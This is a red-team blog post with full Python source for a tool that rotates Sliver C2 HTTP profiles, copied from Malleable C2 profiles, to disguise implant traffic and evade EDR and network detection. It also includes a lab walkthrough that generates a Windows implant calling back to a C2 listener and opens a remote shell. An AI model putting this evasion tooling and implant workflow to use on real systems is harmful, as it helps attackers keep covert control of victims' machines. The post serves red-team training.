---
title: Malleable C2
draft: false
tags:
  - c2
  - sliver
  - av-evasion
  - redteam
  - payload
---

# Dynamic C2: Automating Sliver Profile Switching

## Introduction

One key difference between red teaming and standard penetration testing is the need to stay undetected by EDR and AV systems. There’s little value in building a payload if your C2 traffic is immediately flagged.

To help with this, I worked on creating a dynamic Sliver C2 setup that makes implant traffic more flexible and less predictable. While customizing profiles alone won’t guarantee evasion, automating profile rotation can better simulate real-world adversaries and reduce patterns that defenders look for.

I also wanted to remove the need for manual profile changes for every new engagement. This project automates that process, making it easier to rotate and manage Sliver C2 profiles.

In this post, I’ll share what I built, why I built it, and how you can use it in your own operations.

> Special thanks to Red raccoon (`@choi`,`@groot`, and `@min`) for inspiring this project through their excellent course, **Red Team Lite (RTL)**.

## Sliver Installation

Let's first install Sliver on local machine:

```scss
cd /opt 
sudo git -c http.proxy="" -c https.proxy="" clone https://github.com/BishopFox/sliver.git
cd ./sliver
sudo git checkout tags/v1.5.43
```

Ok. Now we have the latest version of Sliver on our testing machine. 


## 1-Dynamic HTTP Profile Rotation

When red teaming, operational security isn’t just about writing good implants—it’s about making their communication look as normal as possible. Otherwise, you risk getting caught by network detection systems like EDRs or next-gen firewalls.

One way adversaries do this is by customizing HTTP traffic to look like legitimate services—a technique popularized by Cobalt Strike’s _Malleable C2 Profiles_. However, Sliver doesn’t directly support Malleable profiles, and customizing Sliver’s HTTP profiles is manual and tedious.

To address this, I built `profile-switch.py`—a script that automatically converts and applies Malleable C2 profiles from a public repo to Sliver’s config, rotates them on demand, or even switches them automatically at regular intervals.

### Why Malleable Profiles?

Malleable profiles define how a C2’s HTTP(S) traffic _looks_—including HTTP methods, URIs, headers, and more. Using realistic profiles helps avoid detection by making beacon traffic look like common web services (e.g., Outlook, Slack, or AWS APIs).

However, Sliver’s HTTP C2 config uses a simple JSON file (`~/.sliver/configs/http-c2.json`) with a `headers` section, unlike the Malleable C2 `.profile` format. So I needed a way to parse and convert those profiles to Sliver-compatible JSON.

### The Profile Repository

I used the excellent open-source collection **[Malleable-C2-Profiles](https://github.com/BC-SECURITY/Malleable-C2-Profiles/tree/master)**, which includes hundreds of real-world inspired profiles organized by category (APT, Crimeware, Normal). It’s widely used for research and training, making it perfect for this project.

### Main Challenges

Malleable profiles look like this:

```json
set useragent "Mozilla/5.0";
header "Host" "api.amazon.com";
header "Accept" "application/json";
```

But Sliver’s JSON config wants this:

```json
"implant_config": {
  "headers": [
    {"name": "Host", "value": "api.amazon.com"},
    {"name": "Accept", "value": "application/json"}
  ]
}
```

The main issues that I faced were:

- Parsing profiles reliably (some lines are tricky with quotes and escaped characters).
- Converting them to JSON dictionaries expected by Sliver.
- Avoiding duplicate header names, which can break HTTP requests in some cases.

Other than above issues, project went on pretty smooth. 

Now let's break down how I did it. 

### Break Down
#### Cloning the profile repo

I first need to clone the profile repository. This ensures we have the latest profiles locally:

```scss
BASE_DIR = Path.home() / "Malleable-C2-Profiles"
GIT_REPO_URL = "https://github.com/threatexpress/malleable-c2"

def ensure_repo():
    if not BASE_DIR.exists():
        print(f"[*] Cloning Malleable-C2-Profiles into {BASE_DIR} ...")
        subprocess.run(["git", "clone", GIT_REPO_URL, str(BASE_DIR)], check=True)
```

#### List Categories

Below function will allow the operator to see which categories of profiles are available for selection:

```python
def list_categories():
    print("[*] Available categories:")
    for item in sorted(BASE_DIR.iterdir()):
        if item.is_dir() and not item.name.startswith("."):
            print(f"  - {item.name}")
```

#### Parsing Profiles

Below function will parse each profile line by line, extract headers, and built them into the JSON format Sliver understands:

```python
def parse_profile(profile_path):
    headers = []
    with profile_path.open() as f:
        for line in f:
            line = line.strip()
            if line.startswith("header "):
                parts = line.split(None, 2)
                if len(parts) == 3:
                    _, raw_name, raw_value = parts
                    name = raw_name.strip("\"';")
                    value = raw_value.strip("\"';").replace('\\"', '')
                    headers.append({"name": name, "value": value})
    return headers
```

#### Update Sliver's Config

This function will replace the existing Sliver HTTP headers with the new profile's headers:

```python
SLIVER_CONFIG = Path.home() / ".sliver" / "configs" / "http-c2.json"

def update_sliver_config(headers):
    with open(SLIVER_CONFIG) as f:
        config = json.load(f)
    config["implant_config"]["headers"] = headers
    with open(SLIVER_CONFIG, "w") as f:
        json.dump(config, f, indent=4)
    print("[+] Sliver HTTP C2 config updated successfully!")
```

#### Auto-Switching Profiles

Below loop allows Sliver to dynamically rotate profiles at configurable intervals, helping simulate a more advanced adversary and avoiding detection by static rules:

```python
def auto_switch_loop(profiles, switch_time, unique_header_names):
    print(f"[*] Starting auto-switch mode: rotating every {switch_time} minute(s)")
    try:
        while True:
            selected_profile = pick_profile(profiles)
            print(f"[*] Auto-switch: selected profile: {selected_profile}")
            headers = parse_profile(selected_profile)
            if unique_header_names:
                headers = deduplicate_headers(headers)
            backup_config()
            update_sliver_config(headers)
            print(f"[+] Next switch in {switch_time} minute(s)...\n")
            time.sleep(switch_time * 60)
    except KeyboardInterrupt:
        print("\n[*] Auto-switch stopped by user.")
```

### How to Use it

Using the `--help` flag, we can list all the options for `profile-switch.py`:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --help
usage: profile-switch.py [-h] [--category CATEGORY] [--profile PROFILE]
                         [--random] [--list-categories] [--update]
                         [--unique-header-names] [--auto-switch]
                         [--switch-time SWITCH_TIME]

Rotate Sliver HTTP C2 profile with Malleable C2 examples

options:
  -h, --help            show this help message and exit
  --category CATEGORY   Category in Malleable-C2-Profiles repo (e.g., Normal,
                        Crimeware, APT). Case-insensitive.
  --profile PROFILE     Specific profile name to apply (e.g., amazon.profile).
                        Searches all categories.
  --random              Pick a completely random profile from all categories.
  --list-categories     List available categories and exit.
  --update              Pull the latest profiles from the repo and exit.
  --unique-header-names
                        Ensure each header name appears only once.
  --auto-switch         Automatically switch profiles in a loop.
  --switch-time SWITCH_TIME
                        Time in minutes between automatic profile switches
                        (default: 60).
```

Users are able to list available categories using the flag `--list-categories`:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --list-categories
[*] Malleable-C2-Profiles already exists at /root/Malleable-C2-Profiles
[*] Available categories:
  - APT
  - Crimeware
  - Normal
```

Let's say we want the traffic to look normal. Then we use the `--category` flag to select `Normal` and the script will automatically choose whatever profile inside the `Normal` category and update our `http-c2.json` file:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --category Normal
[*] Malleable-C2-Profiles already exists at /root/Malleable-C2-Profiles
[*] Selected profile: /root/Malleable-C2-Profiles/Normal/microsoftupdate_getonly.profile
[*] Backed up original config to /root/.sliver/configs/http-c2.json.bak
[+] Sliver HTTP C2 config updated successfully!
```

If we take a look at `http-c2.json` file after running the above code, we can see that it had been successfully updated:

```json
root@yoon-XH695R:/opt/sliver# cat ~/.sliver/configs/http-c2.json
{
    "implant_config": {
        "user_agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "chrome_base_version": 132,
        "macos_version": "10_16_8",
        "nonce_query_args": "http%3A%2F%2Fwww.amazon.com\";",
        "url_parameters": null,
        "headers": [
            {
                "name": "Accept",
                "value": "*/*"
            },
            {
                "name": "Host",
                "value": "download.windowsupdate.com"
            },
            {
...
```

If we want something totally random, we can use the flag `--random` and the script will choose a random profile regardless of category:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --random
[*] Selected profile: /root/Malleable-C2-Profiles/Crimeware/magnitude.profile
[*] Backed up original config to /root/.sliver/configs/http-c2.json.bak
[+] Sliver HTTP C2 config updated successfully!
```

To choose a specific profile we can use the flag `--profile`:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --profile amazon.profile
[*] Selected profile: /root/Malleable-C2-Profiles/Normal/amazon.profile
[*] Backed up original config to /root/.sliver/configs/http-c2.json.bak
[+] Sliver HTTP C2 config updated successfully!
```

To update the github repo use the flag `--update`:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --update
[*] Updating Malleable-C2-Profiles ...
Already up to date.
[+] Profiles updated successfully.
```

Another key feature is `--auto-switch`. Using this flag along with `--swithc-time`, we can set intervals and automatically change Sliver HTTP profiles:

```scss
root@yoon-XH695R:/opt/sliver# python3 profile-switch.py --category APT --auto-switch --switch-time 1
[*] Malleable-C2-Profiles already exists at /root/Malleable-C2-Profiles
[*] Starting auto-switch mode: rotating every 1 minute(s)
[*] Auto-switch: selected profile: /root/Malleable-C2-Profiles/APT/ratankba.profile
[*] Backed up original config to /root/.sliver/configs/http-c2.json.bak
[+] Sliver HTTP C2 config updated successfully!
[+] Next switch in 1 minute(s)...

[*] Auto-switch: selected profile: /root/Malleable-C2-Profiles/APT/pitty_tiger.profile
[*] Backed up original config to /root/.sliver/configs/http-c2.json.bak
[+] Sliver HTTP C2 config updated successfully!
[+] Next switch in 1 minute(s)...
```

Above command will change the Sliver HTTP profile to any inside the category `APT` within every one minute. Without the `--switch-time` flag, interval is set as 60 minutes by default. 

### Validation

Now let's validate whether the changed profiles are taking affect. 

Go launch Sliver and create a Implant with HTTP listener:

```scss
[server] sliver > http

[*] Starting HTTP :80 listener ...
[*] Successfully started job #4

[server] sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 4    http   tcp        80      
 
[server] sliver > generate --http 192.168.35.17 --os windows --arch amd64 --format exe --save /tmp

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 12s
[*] Implant saved to /tmp/DEFIANT_DRAFT.exe
```

Using the command `sudo chown yoon:yoon /tmp/DEFIANT_DRAFT.exe`, make the implant transferable and move it to the target machine (Windows VM) using `python3 -m http.server <port>`.

Ok. Now let's log the traffic before we establish a connection. 

We can use `tcpdump` to do so:

```scss
yoon@yoon-XH695R:~$ sudo tcpdump -i vmnet8 host 172.16.76.130 -w /tmp/sliver_traffic.pcap
tcpdump: listening on vmnet8, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Now that we have `tcpdump` listening, run the the implant on target machine. 

Once we download and execute the implant on our target Windows machine, session will be established:

```scss
[*] Session bbd1a6c1 DEFIANT_DRAFT - 192.168.35.17:46959 (DESKTOP-BN3RLJ1) - windows/amd64 - Sat, 05 Jul 2025 00:19:44 KST

[server] sliver > sessions

 ID         Transport   Remote Address        Hostname          Username   Operating System   Health  
========== =========== ===================== ================= ========== ================== =========
 bbd1a6c1   http(s)     192.168.35.17:46959   DESKTOP-BN3RLJ1   yoon       windows/amd64      [ALIVE] 
```

Let's create a shell and throw in some couple commands to generate some traffic:

```scss
[server] sliver (DEFIANT_DRAFT) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 5232

PS C:\Users\yoon\Downloads> whoami
whoami
desktop-bn3rlj1\yoon
```

Now go back to the `.pcap` file we've been logging and open it up on Wireshark:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/refs/heads/v4/Images/RedTeam/malleablec2/1.png)

Click on some of the suspicious looking traffic and follow on TCP stream:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/refs/heads/v4/Images/RedTeam/malleablec2/2.png)

Hooray! Our traffic is now changed to something we set using `profile-switch.py`. 

## Summary

This post covered how to adapt Malleable C2 profiles for Sliver by automating their conversion and rotation with `profile-switch.py`. By using real-world HTTP profiles and switching them regularly, you can make beacon traffic less predictable and better simulate advanced adversaries. While this won’t guarantee evasion, it helps keep operations dynamic and more closely aligned with real attack behaviors.

This was fun to play with. Next time, Imma go for something more dynamic. 

I will be back.

## References
- https://github.com/BC-SECURITY/Malleable-C2-Profiles
- RTL (Red Team Lite) from [Red Raccoon](https://www.redraccoon.kr/)
- https://www.vaadata.com/blog/antivirus-and-edr-bypass-techniques/
- https://www.verylazytech.com/windows/antivirus-av-bypass#amsi-anti-malware-scan-interface

## Appendix

- Code 1. `profile-switch.py`

```python
#!/usr/bin/env python3

import argparse
import os
import sys
import random
import json
import shutil
import subprocess
import time
from pathlib import Path

BASE_DIR = Path.home() / "Malleable-C2-Profiles"
SLIVER_CONFIG = Path.home() / ".sliver" / "configs" / "http-c2.json"
GIT_REPO_URL = "https://github.com/threatexpress/malleable-c2"

def ensure_repo():
    if not BASE_DIR.exists():
        print(f"[*] Cloning Malleable-C2-Profiles into {BASE_DIR} ...")
        subprocess.run(["git", "clone", GIT_REPO_URL, str(BASE_DIR)], check=True)
    else:
        print(f"[*] Malleable-C2-Profiles already exists at {BASE_DIR}")

def update_repo():
    if BASE_DIR.exists():
        print(f"[*] Updating Malleable-C2-Profiles ...")
        subprocess.run(["git", "-C", str(BASE_DIR), "pull"], check=True)
        print("[+] Profiles updated successfully.")
    else:
        print("[!] Profiles directory not found. Please run the script once to clone it first.")
        sys.exit(1)

def list_categories():
    print("[*] Available categories:")
    for item in sorted(BASE_DIR.iterdir()):
        if item.is_dir() and not item.name.startswith("."):
            print(f"  - {item.name}")

def parse_profile(profile_path):
    headers = []
    with profile_path.open() as f:
        for line in f:
            line = line.strip()
            if line.startswith("header "):
                parts = line.split(None, 2)
                if len(parts) == 3:
                    _, raw_name, raw_value = parts
                    name = raw_name.strip("\"';")
                    value = raw_value.strip("\"';").replace('\\"', '')
                    headers.append({"name": name, "value": value})
    return headers

def deduplicate_headers(headers):
    seen = set()
    unique_headers = []
    for hdr in headers:
        lname = hdr["name"].lower()
        if lname not in seen:
            seen.add(lname)
            unique_headers.append(hdr)
    return unique_headers

def find_profiles(category=None):
    profiles = []
    if category:
        # Search categories case-insensitively
        matched_category = None
        for item in BASE_DIR.iterdir():
            if item.is_dir() and not item.name.startswith("."):
                if item.name.lower() == category.lower():
                    matched_category = item
                    break
        if not matched_category:
            print(f"[!] Category '{category}' not found!")
            sys.exit(1)
        profiles = list(matched_category.glob("*.profile"))
    else:
        # Search all categories
        for cat in BASE_DIR.iterdir():
            if cat.is_dir() and not cat.name.startswith("."):
                profiles.extend(cat.glob("*.profile"))
    return profiles


def pick_profile(profiles, profile_name=None):
    if profile_name:
        for profile in profiles:
            if profile.name == profile_name:
                return profile
        print(f"[!] Profile '{profile_name}' not found!")
        sys.exit(1)
    else:
        return random.choice(profiles)

def backup_config():
    backup_path = SLIVER_CONFIG.with_suffix(".json.bak")
    shutil.copy2(SLIVER_CONFIG, backup_path)
    print(f"[*] Backed up original config to {backup_path}")

def update_sliver_config(headers):
    with open(SLIVER_CONFIG) as f:
        config = json.load(f)
    config["implant_config"]["headers"] = headers
    with open(SLIVER_CONFIG, "w") as f:
        json.dump(config, f, indent=4)
    print("[+] Sliver HTTP C2 config updated successfully!")

def auto_switch_loop(profiles, switch_time, unique_header_names):
    print(f"[*] Starting auto-switch mode: rotating every {switch_time} minute(s)")
    try:
        while True:
            selected_profile = pick_profile(profiles)
            print(f"[*] Auto-switch: selected profile: {selected_profile}")
            headers = parse_profile(selected_profile)

            if unique_header_names:
                headers = deduplicate_headers(headers)

            backup_config()
            update_sliver_config(headers)

            print(f"[+] Next switch in {switch_time} minute(s)...\n")
            time.sleep(switch_time * 60)
    except KeyboardInterrupt:
        print("\n[*] Auto-switch stopped by user.")

def main():
    parser = argparse.ArgumentParser(
        description="Rotate Sliver HTTP C2 profile with Malleable C2 examples"
    )
    parser.add_argument("--category", help="Category in Malleable-C2-Profiles repo (e.g., Normal, Crimeware, APT). Case-insensitive.")
    parser.add_argument("--profile", help="Specific profile name to apply (e.g., amazon.profile). Searches all categories.")
    parser.add_argument("--random", action="store_true", help="Pick a completely random profile from all categories.")
    parser.add_argument("--list-categories", action="store_true", help="List available categories and exit.")
    parser.add_argument("--update", action="store_true", help="Pull the latest profiles from the repo and exit.")
    parser.add_argument("--unique-header-names", action="store_true", help="Ensure each header name appears only once.")
    parser.add_argument("--auto-switch", action="store_true", help="Automatically switch profiles in a loop.")
    parser.add_argument("--switch-time", type=int, default=60, help="Time in minutes between automatic profile switches (default: 60).")

    args = parser.parse_args()

    if args.update:
        update_repo()
        sys.exit(0)

    ensure_repo()

    if args.list_categories:
        list_categories()
        sys.exit(0)

    category = args.category
    if category:
        category = category.strip().capitalize()

    profiles = find_profiles(category)

    if args.auto_switch:
        auto_switch_loop(
            profiles,
            args.switch_time,
            args.unique_header_names
        )
        sys.exit(0)

    if args.random or not args.profile:
        selected_profile = pick_profile(profiles)
    else:
        selected_profile = pick_profile(profiles, profile_name=args.profile)

    print(f"[*] Selected profile: {selected_profile}")

    headers = parse_profile(selected_profile)

    if args.unique_header_names:
        headers = deduplicate_headers(headers)

    backup_config()
    update_sliver_config(headers)

if __name__ == "__main__":
    main()
```

